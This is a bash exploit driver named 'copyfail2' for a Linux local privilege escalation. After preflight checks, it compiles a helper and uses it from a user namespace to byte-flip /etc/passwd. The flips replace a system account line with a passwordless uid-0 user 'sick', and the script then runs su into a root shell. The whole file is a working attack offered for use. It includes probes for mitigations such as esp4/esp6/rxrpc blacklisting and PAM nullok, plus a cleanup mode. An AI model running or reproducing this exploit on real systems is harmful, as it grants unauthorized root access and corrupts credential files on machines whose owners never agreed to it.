#!/bin/bash
# copyfail2 — adds a passwordless uid-0 user "sick" to /etc/passwd and
# drops you into its shell. No SUID helper, no auto-restore.
#
# Overwrites a system /etc/passwd line (mail/games/etc, longest line
# with a nologin/false/sync shell) with `sick::0:0:<pad>:/:<root-shell>` —
# length-matched, valid 7-field entry, empty password field. PAM
# pam_unix.so nullok accepts empty input password. Shell path and
# victim-line shell match are auto-derived so non-FHS distros (NixOS,
# Guix, Gobo) work without manual edits.
#
# Usage:
#   ./run.sh           install + drop into root shell
#   ./run.sh --clean   undo the install (revert /etc/passwd via the same primitive)
#   ./run.sh --check   pre-flight checks only (no modifications)

set -u
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
STATE=/var/tmp/.cf2.state
NEW_USER=sick
PREFIX="${NEW_USER}::0:0:"

# Derive the SUFFIX shell from root's actual /etc/passwd entry so we match
# whatever path layout the distro uses (NixOS = /run/current-system/sw/bin/bash,
# others = /bin/bash). Falls back to /bin/bash if root's shell can't be parsed.
ROOT_SHELL=$(awk -F: '$1=="root" {print $7; exit}' /etc/passwd 2>/dev/null)
[ -n "$ROOT_SHELL" ] || ROOT_SHELL=/bin/bash
SUFFIX=":/:${ROOT_SHELL}"

red()    { printf '\033[31m%s\033[0m\n' "$*" >&2; }
green()  { printf '\033[32m%s\033[0m\n' "$*"; }
blue()   { printf '\033[34m=== %s\033[0m\n' "$*"; }
yellow() { printf '\033[33m%s\033[0m\n' "$*" >&2; }

# ---------- preflight ----------
distro_id() {
    [ -r /etc/os-release ] && ( . /etc/os-release && echo "${ID:-unknown}" ) || echo unknown
}

# CONFIG_USER_NS off (e.g. SlicerVM/Firecracker minimal kernels) → no exploit.
check_userns() {
    [ -e /proc/self/ns/user ] || { red "no user namespaces (CONFIG_USER_NS=n)"; return 1; }
    if [ -r /proc/sys/kernel/unprivileged_userns_clone ] && \
       [ "$(cat /proc/sys/kernel/unprivileged_userns_clone)" = 0 ]; then
        red "kernel.unprivileged_userns_clone=0"; return 1
    fi
    return 0
}

# dirtyfrag-style modprobe blacklist on esp4/esp6/rxrpc kills the primitive.
check_xfrm() {
    if grep -qE '^[[:space:]]*(install|blacklist)[[:space:]]+(esp4|esp6|rxrpc)' \
        /etc/modprobe.d/*.conf /etc/modprobe.conf /usr/lib/modprobe.d/*.conf \
        /run/modprobe.d/*.conf 2>/dev/null; then
        red "esp4/esp6/rxrpc blacklisted (dirtyfrag-style mitigation)"; return 1
    fi
    if ! [ -d /sys/module/esp4 ] && ! modprobe -n esp4 >/dev/null 2>&1; then
        red "esp4 module not buildable on this kernel (CONFIG_INET_ESP off?)"; return 1
    fi
    return 0
}

# The passwd-flip payload only completes if PAM accepts an empty password
# (pam_unix.so nullok). NixOS doesn't ship that by default.
check_pam_nullok() {
    # Strip comments (#-prefixed lines) before checking, otherwise commented-out
    # nullok references give a false positive.
    {
        cat /etc/pam.d/* /etc/pam.conf 2>/dev/null
        cat /etc/pam.d/*/* 2>/dev/null
    } | grep -vE '^[[:space:]]*#' \
      | grep -qE 'pam_unix\.so[[:space:]][^#]*\bnullok\b'
}

preflight() {
    local d=$(distro_id) ok=1
    blue "Preflight ($d, $(uname -r))"
    check_userns || ok=0
    check_xfrm || ok=0
    if ! check_pam_nullok; then
        ok=0
        red "PAM does not accept empty passwords (no pam_unix.so nullok in /etc/pam.d/)"
        case "$d" in
            nixos)
                yellow "  → enable in NixOS:"
                yellow "      security.pam.services.su.allowNullPassword = true;"
                yellow "      sudo nixos-rebuild switch"
                ;;
            *)
                yellow "  → add 'nullok' to the auth pam_unix.so line in /etc/pam.d/su"
                yellow "    (or system-auth / common-auth, depending on distro)"
                ;;
        esac
    fi
    [ "$ok" = 1 ] && green "[+] preflight OK"
    return $((1 - ok))
}

# Userns harness — try plain unshare first, fall back to aa-rootns.
# Probe must actually grant CAP_NET_ADMIN (Ubuntu apparmor_restrict_unprivileged_userns
# strips caps but `unshare` itself still returns 0).
setup_usns() {
    if unshare -U -r -n -- /bin/sh -c 'ip link add type dummy 2>/dev/null && ip link del dev dummy0 2>/dev/null' 2>/dev/null; then
        USNS=(unshare -U -r -n --)
        return
    fi
    if [ -n "${AAR:-}" ] && [ -x "$AAR" ]; then
        USNS=("$AAR" -n --); return
    fi
    if command -v aa-rootns >/dev/null 2>&1; then
        USNS=("$(command -v aa-rootns)" -n --); return
    fi
    if [ ! -x "$HERE/aa-rootns" ] && [ -f "$HERE/aa-rootns.c" ]; then
        gcc -O2 -Wall "$HERE/aa-rootns.c" -o "$HERE/aa-rootns" \
            || { red "build aa-rootns failed"; exit 1; }
    fi
    if [ -x "$HERE/aa-rootns" ]; then
        USNS=("$HERE/aa-rootns" -n --); return
    fi
    red "no usable userns harness — install aa-rootns or set apparmor_restrict_unprivileged_userns=0"
    exit 1
}

build_helper() {
    [ -x "$HERE/copyfail2" ] || gcc -O2 -Wall "$HERE/copyfail2.c" -o "$HERE/copyfail2" -lcrypto \
        || { red "build copyfail2 failed (need libssl-dev)"; exit 1; }
}

flip_range() {
    # $1 = LINE_OFF, $2 = source string (current bytes), $3 = target string
    local line_off=$1 src=$2 dst=$3 len=${#2}
    local i o t off
    declare -ag FLIPS=()
    for ((i=0; i<len; i++)); do
        o="${src:$i:1}"
        t="${dst:$i:1}"
        if [ "$o" != "$t" ]; then
            FLIPS+=("$((line_off + i)):$(printf '0x%02x' "'$t")")
        fi
    done
    for f in "${FLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2" /etc/passwd "$off" "$t" >/dev/null
    done
}

# ---------- --check ----------
if [ "${1:-}" = "--check" ]; then
    preflight; exit $?
fi

# ---------- --clean ----------
if [ "${1:-}" = "--clean" ] || [ "${1:-}" = "-c" ]; then
    [ -r "$STATE" ] || { red "no state file at $STATE — nothing to clean (or run as the same user that installed)"; exit 1; }
    # shellcheck disable=SC1090
    . "$STATE"
    : "${LINE_OFF:?missing LINE_OFF in state}" "${VICTIM_LINE:?missing VICTIM_LINE in state}"
    VICTIM_LEN=${#VICTIM_LINE}

    setup_usns
    build_helper

    CURRENT=$(dd if=/etc/passwd bs=1 skip="$LINE_OFF" count="$VICTIM_LEN" 2>/dev/null)
    if [ "$CURRENT" = "$VICTIM_LINE" ]; then
        green "[+] /etc/passwd already matches original — clearing state file"
        rm -f "$STATE"
        exit 0
    fi

    # Compute flips
    declare -a CFLIPS=()
    for ((i=0; i<VICTIM_LEN; i++)); do
        o="${CURRENT:$i:1}"
        t="${VICTIM_LINE:$i:1}"
        [ "$o" != "$t" ] && CFLIPS+=("$((LINE_OFF + i)):$(printf '0x%02x' "'$t")")
    done

    blue "Cleanup — revert ${#CFLIPS[@]} bytes at offset $LINE_OFF back to '${VICTIM_LINE%%:*}' line"
    for f in "${CFLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2" /etc/passwd "$off" "$t" >/dev/null
    done

    if grep -q "^${NEW_USER}::0:0:" /etc/passwd; then
        red "sick line still present — clean failed"
        exit 1
    fi
    NEW=$(dd if=/etc/passwd bs=1 skip="$LINE_OFF" count="$VICTIM_LEN" 2>/dev/null)
    if [ "$NEW" != "$VICTIM_LINE" ]; then
        red "post-clean line mismatch — manual fix required"
        echo "expected: $VICTIM_LINE"
        echo "got:      $NEW"
        exit 1
    fi

    rm -f "$STATE"
    green "[+] cleaned — '${VICTIM_LINE%%:*}' line restored, state file removed"
    exit 0
fi

# ---------- default: install ----------
if [ "${1:-}" = "--help" ] || [ "${1:-}" = "-h" ]; then
    sed -n '2,12p' "$0"
    exit 0
fi

# Already installed? Just su.
if getent passwd "$NEW_USER" | grep -q "^${NEW_USER}::0:0:"; then
    green "[+] '$NEW_USER' already in /etc/passwd"
    exec su - "$NEW_USER"
fi

preflight || exit 1

setup_usns
build_helper

getent passwd "$NEW_USER" >/dev/null \
    && { red "'$NEW_USER' already exists in passwd with non-uid-0 entry — pick a different NEW_USER"; exit 1; }

# Pick the longest /etc/passwd line whose shell basename is nologin/false/sync.
# Match by basename (not full path) so distros with non-FHS layouts work
# (NixOS, GoboLinux, Guix, etc.).
VICTIM_LINE=$(awk -F: '
    {
        n = split($NF, parts, "/")
        base = parts[n]
        if (base == "nologin" || base == "false" || base == "sync") {
            if (length($0) > maxlen) { maxlen = length($0); maxline = $0 }
        }
    }
    END { print maxline }
' /etc/passwd)
[ -n "$VICTIM_LINE" ] || { red "no victim line found in /etc/passwd (no nologin/false/sync shell entry long enough)"; exit 1; }
VICTIM_NAME=${VICTIM_LINE%%:*}
VICTIM_LEN=${#VICTIM_LINE}

PAD_LEN=$((VICTIM_LEN - ${#PREFIX} - ${#SUFFIX}))
[ "$PAD_LEN" -ge 0 ] \
    || { red "victim '$VICTIM_NAME' line too short ($VICTIM_LEN chars)"; exit 1; }
PAD=$(printf '%*s' "$PAD_LEN" '' | tr ' ' 'X')
TARGET_LINE="${PREFIX}${PAD}${SUFFIX}"

LINE_OFF=$(grep -nob "^$VICTIM_NAME:" /etc/passwd | head -1 | cut -d: -f2)

# Persist state for --clean before we mutate
umask 077
{
    echo "LINE_OFF=$LINE_OFF"
    printf 'VICTIM_LINE=%q\n' "$VICTIM_LINE"
} > "$STATE"

blue "Stage 1 — overwrite '$VICTIM_NAME' line ($VICTIM_LEN bytes) with '$NEW_USER::0:0:<pad>:/:/bin/bash'"
flip_range "$LINE_OFF" "$VICTIM_LINE" "$TARGET_LINE"

blue "Stage 2 — verify"
grep "^$NEW_USER:" /etc/passwd || { red "mutation didn't land"; exit 1; }

blue "Stage 3 — su - $NEW_USER (empty password via PAM nullok)"
green "[i] state saved to $STATE — run './run.sh --clean' to revert"
exec su - "$NEW_USER"
